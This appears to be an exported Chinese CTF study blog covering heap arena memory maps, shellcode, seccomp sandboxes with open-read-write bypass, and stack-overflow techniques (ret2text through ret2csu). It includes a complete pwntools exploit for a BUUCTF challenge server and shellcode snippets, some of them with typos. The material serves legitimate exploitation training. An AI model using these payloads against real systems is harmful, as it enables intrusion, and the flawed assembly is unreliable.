class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样<strong>不会</strong>把内存重新给系统。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>After free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2025/01/26/shellcode/"/>
    <url>/2025/01/26/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell</li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,mov rax, 0x68732f6e69622f ;这里后面那一大串是/bin/sh<br>push rax<br>mov rdi,rsp    ;这两行使rdi指向/bin/sh<br>mov esi,0<br>mov edo,0<br>mov rax,0x3b<br>int 0x80<br></code></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read_flag=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi,rax;</span><br><span class="hljs-string">mov rsi,rsp;</span><br><span class="hljs-string">......</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(read_flag)<br></code></pre></td></tr></table></figure><h1 id="沙盒下的orw绕过"><a href="#沙盒下的orw绕过" class="headerlink" title="沙盒下的orw绕过"></a>沙盒下的orw绕过</h1><h2 id="沙箱保护"><a href="#沙箱保护" class="headerlink" title="沙箱保护"></a>沙箱保护</h2><ul><li>对程序加入的一些保护，最常见的是禁用一些系统调用，比如exceve，使我们不可通过系统调用获取到权限，因此只能通过<strong>ROP的方式调用open,read,write</strong>等来读取并打印flag内同</li></ul><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>就是open, read,write简写，就是打开，写入，输出flag</p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>利用seccomp-tools查看是否开启了沙箱，以及沙箱中一些允许的syscall</p><p>安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gcc ruby-dev<br>gem <span class="hljs-keyword">install</span> seccomp-tools<br></code></pre></td></tr></table></figure><p>检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h2 id="开启沙箱"><a href="#开启沙箱" class="headerlink" title="开启沙箱"></a>开启沙箱</h2><h3 id="prctl-函数调用"><a href="#prctl-函数调用" class="headerlink" title="prctl()函数调用"></a>prctl()函数调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// 主要关注prctl()函数的第一个参数，也就是option,设定的option的值的不同导致黑名单不同，介绍2个比较重要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则 禁用execve系统调用 且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure></li></ul><h3 id="seccomp-系统调用"><a href="#seccomp-系统调用" class="headerlink" title="seccomp()系统调用"></a>seccomp()系统调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)</span><br>  <span class="hljs-comment">// seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</span><br>  v1 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// seccomp_rule_add添加规则</span><br>  <span class="hljs-comment">// v1对应上面初始化的返回值</span><br>  <span class="hljs-comment">// 0x7fff0000即对应宏SCMP_ACT_ALLOW</span><br>  <span class="hljs-comment">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>  <span class="hljs-comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制</span><br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">60LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">231LL</span>, <span class="hljs-number">0LL</span>);<br><br>  <span class="hljs-comment">// seccomp_load-&gt;将当前seccomp过滤器加载到内核中</span><br>  <span class="hljs-keyword">if</span> ( seccomp_load(v1) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-comment">// seccomp_release-&gt;释放seccomp过滤器状态</span><br>    <span class="hljs-comment">// 但对已经load的过滤规则不影响</span><br>    seccomp_release(v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="shellcode的写入"><a href="#shellcode的写入" class="headerlink" title="shellcode的写入"></a>shellcode的写入</h2><p>一般溢出的大小不够写入很长的ROP链，因此提供mmap()函数，从而给出一段栈上的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offsize)</span>; <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *mmap&#123;<br>    <span class="hljs-type">void</span> *addr; <span class="hljs-comment">//映射区首地址，传NULL</span><br>    <span class="hljs-type">size_t</span> length; <span class="hljs-comment">//映射区大小</span><br>    <span class="hljs-comment">//会自动调为4k的整数倍</span><br>    <span class="hljs-comment">//不能为0</span><br>    <span class="hljs-comment">//一般文件多大，length就指定多大</span><br>    <span class="hljs-type">int</span> prot; <span class="hljs-comment">//映射区权限</span><br>    <span class="hljs-comment">//PROT_READ 映射区必须要有读权限</span><br>    <span class="hljs-comment">//PROT_WRITE</span><br>    <span class="hljs-comment">//PROT_READ | PROT_WRITE</span><br>    <span class="hljs-type">int</span> flags; <span class="hljs-comment">//标志位参数</span><br>    <span class="hljs-comment">//MAP_SHARED 修改内存数据会同步到磁盘</span><br>    <span class="hljs-comment">//MAP_PRIVATE 修改内存数据不会同步到磁盘</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">//要映射文件所对应的文件描述符</span><br>    <span class="hljs-type">off_t</span> offset; <span class="hljs-comment">//映射文件的偏移量，从文件哪个位置开始</span><br>    <span class="hljs-comment">//映射的时候文件指针的偏移量</span><br>    <span class="hljs-comment">//必须是4k的整数倍</span><br>    <span class="hljs-comment">//一般设为0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737913055216.png" alt="参数"></p><p>比如说</p><p><code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><ol><li><strong><code>addr</code></strong>: <code>(void *)0x123000</code><ul><li>这是请求映射的起始地址。<code>0x123000</code> 是一个具体的地址值。如果 <code>mmap</code> 调用成功，内核会尝试将内存映射到这个地址。如果地址不可用，内核会选择一个合适的地址。</li></ul></li><li><strong><code>length</code></strong>: <code>0x1000uLL</code><ul><li>这是请求映射的内存区域的长度，单位是字节。<code>0x1000</code> 是 16 进制表示，等于 4096 字节（1 页）。</li></ul></li><li><strong><code>prot</code></strong>: <code>6</code><ul><li>这是内存区域的保护标志，定义了对该区域的访问权限。<code>6</code> 是 <code>PROT_READ | PROT_WRITE</code> 的组合，表示该区域可以读写。</li></ul></li><li><strong><code>flags</code></strong>: <code>34</code><ul><li>这是映射的标志，定义了映射的类型和行为。<code>34</code> 是 <code>MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS</code> 的组合，具体含义如下：<ul><li><code>MAP_PRIVATE</code>: 创建一个私有映射，对映射区域的修改不会反映到原始文件中。</li><li><code>MAP_FIXED</code>: 强制使用指定的地址 <code>addr</code>，如果该地址不可用，调用会失败。</li><li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射，不与任何文件关联。</li></ul></li></ul></li><li><strong><code>fd</code></strong>: <code>-1</code><ul><li>这是文件描述符，用于指定映射的文件。<code>-1</code> 表示不映射任何文件，通常与 <code>MAP_ANONYMOUS</code> 一起使用。</li></ul></li><li><strong><code>offset</code></strong>: <code>0LL</code><ul><li>这是文件中的偏移量，用于指定映射的起始位置。<code>0LL</code> 表示从文件的开头开始映射。</li></ul></li></ol><p>orw绕过就是open flag，将flag写入某个区域，再write出来</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h3><p> <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">BUUCTF在线评测</a> </p><p>checksec</p><p>懒得放截图了，反正64位什么都没开</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992637686.png" alt="seccomp-tools"></p><p>只允许read,write,open系统调用</p><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992793323.png" alt="main"></p><p>可以看到从0x123000给分配了0x1000字节空间，权限可写可执行</p><p>直接看第三个函数</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992758135.png" alt="第三个"></p><p>存在栈溢出，但长度小</p><ul><li><p>思路：</p><p>在mmap分配的区域进行orw，并且在这个区域写入flag并输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><span class="hljs-comment"># 写在mmap+0x100的地方</span><br><span class="hljs-comment"># orw写在mmap来执行</span><br></code></pre></td></tr></table></figure><p>现在的问题是如何让rip指向那一块区域</p><p>发现程序有一个<code>jmp rsp</code>可以利用</p><p>那么我们可以构造栈</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993374830.png" alt="栈"></p></li></ul><p>因为函数结束是有<code>leave;ret</code>leave让rsp跑到了序号2（rbp）位置，rbp跑走了，然后ret再让rsp再移动到序号1的位置，此时与read相距0x28+8&#x3D;0x30<br>所以是<code>sub rsp,0x30</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>完整：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bad&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29724</span>)<br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!\n&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><br>orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br>r.sendline(payload)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.sendline(orw)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>成功得到</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993658927.png" alt="^^"></p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理： 利用危险函数，将返回地址填充到栈帧上的返回地址，从<strong>控制该函数结束时返回到的地方</strong></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h1 id="初级栈溢出"><a href="#初级栈溢出" class="headerlink" title="初级栈溢出"></a>初级栈溢出</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>利用<code>.text</code>段中的代码</p><p>确定填充长度后   构造payload即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul><li><p>shellcode</p><p>控制程序执行shellcode代码，常见功能是获取目标系统的shell，我们需向<strong>内存中填充一些可执行的代码</strong></p><p>意味着，<strong>shellcode所在区域需要有可执行的权限</strong></p></li><li><p>原理：</p><p>我们向可执行的区域写入shellcode，然后执行即可</p></li><li><p>pwntools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>一键生成shellcode</p></li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul><li><p>原理：</p><p>利用系统调用获取shell</p></li><li><p>系统调用知识补充：</p><p>跟函数没什么区别，不过我们所调用的函数是系统给的罢了</p><p><strong>系统调用号：rax</strong></p><p><strong>前6个参数：rdi rsi rdx r10 r8 r9</strong></p><ul><li><p>系统调用号</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x1.png" alt="32位"><br>                                                   <strong>32位</strong><br><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x2.png" alt="64位"><br>                                                   <strong>64位</strong></p></li></ul></li><li><p>ret2syscall</p><ul><li><p>寻找gadgets来控制寄存器为特定的值从而执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>工具：<code>ROPgadget --binary 可执行文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p></li></ul></li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul><li><p>.plt与.got</p><p> <a href="https://blog.csdn.net/2301_80976241/article/details/144333148?ops_request_misc=%7B%22request_id%22:%22990dac9d47abe207078a2f01ce0ce74f%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=990dac9d47abe207078a2f01ce0ce74f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144333148-null-null.142%5Ev101%5Epc_search_result_base9&utm_term=plt%E4%B8%8Egot&spm=1018.2226.3001.4187">简单聊聊PLT和GOT_plt与got-CSDN博客</a> </p><p><strong>PLT（Procedure Linkage Table）</strong></p><p>PLT 是一个<strong>跳转表</strong>，跳转到got表，从而执行函数</p><p><strong>工作原理:</strong></p><p>当程序第一次调用共享库中的函数时，会通过 PLT 跳转到一个 stub 代码段。这个 stub 会将控制权转移到动态链接器(ld.so),动态链接器会在 GOT 中查找或解析目标函数的实际地址，<strong>然后更新 GOT 的对应条目</strong>,之后，<strong>再次调用同一函数时，PLT 会直接从 GOT 中读取已解析的地址并跳转到目标函数</strong>。</p><p><strong>GOT（Global Offset Table）</strong></p><p>GOT 是一个表，<strong>存储程序运行时需要使用的全局变量和函数的实际地址。</strong></p><p><strong>工作原理:</strong></p><p>程序加载时，GOT 的条目中存储的是共享库函数的默认入口地址（通常指向 PLT 中的 stub），当动态链接器解析了实际的函数地址后，<strong>会更新 GOT 对应的条目，使其指向正确的目标函数</strong>，之后，主程序对函数的调用直接通过 GOT 获取实际地址，提高效率。</p><p>也就是说，<strong>在使用一次函数后，got内存储的是真实地址</strong></p><p><strong>PLT 和 GOT协同找到正确的函数地址</strong><br>工作流程： 首先主程序中所有对共享库函数的调用，<strong>都会经过 PLT 跳转</strong>。然后PLT 中的第一跳通常指向 GOT 表中的一项。此时GOT 中的条目在未解析时会指向 PLT 中的 stub 地址，动态链接器负责更新 GOT 条目。解析完成后，<strong>GOT 保存目标函数的真实地址</strong>，后续调用直接通过 GOT 加快速度。</p></li><li><p>ret2libc</p><p>也就是利用libc中的system函数和&#x2F;bin&#x2F;sh的地址获取目标系统shell</p><p>利用泄露已知函数的真实地址，计算libc基地址，从而得到system与&#x2F;bin&#x2F;sh的真实地址，从而得到shell</p></li></ul><h1 id="中级栈溢出"><a href="#中级栈溢出" class="headerlink" title="中级栈溢出"></a>中级栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>在64位程序中，前6个参数由寄存器传递，但大多数时候，难找到每一个寄存器的gadgets，这时可以利用_libc_csu_csu中的gadgets</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004005</span>C0 ; <span class="hljs-type">void</span> _libc_csu_init(<span class="hljs-type">void</span>)<br>.text:<span class="hljs-number">00000000004005</span>C0                 public __libc_csu_init<br>.text:<span class="hljs-number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>o<br>.text:<span class="hljs-number">00000000004005</span>C0                 push    r15<br>.text:<span class="hljs-number">00000000004005</span>C2                 push    r14<br>.text:<span class="hljs-number">00000000004005</span>C4                 mov     r15d, edi<br>.text:<span class="hljs-number">00000000004005</span>C7                 push    r13<br>.text:<span class="hljs-number">00000000004005</span>C9                 push    r12<br>.text:<span class="hljs-number">00000000004005</span>CB                 lea     r12, 